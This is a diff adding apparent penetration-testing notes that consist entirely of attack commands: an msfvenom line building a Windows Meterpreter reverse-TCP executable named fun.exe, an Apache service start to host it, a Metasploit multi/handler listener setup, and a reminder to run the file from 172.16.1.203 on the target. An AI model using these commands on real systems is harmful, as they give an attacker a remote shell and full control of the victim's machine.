@@ -1,0 +1,12 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.203 -f exe > /var/www/html/fun.exe
+service apache2 start
+
+msfconsole
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+exploit
+
+
+Running on target
+- http://172.16.1.203/fun.exe
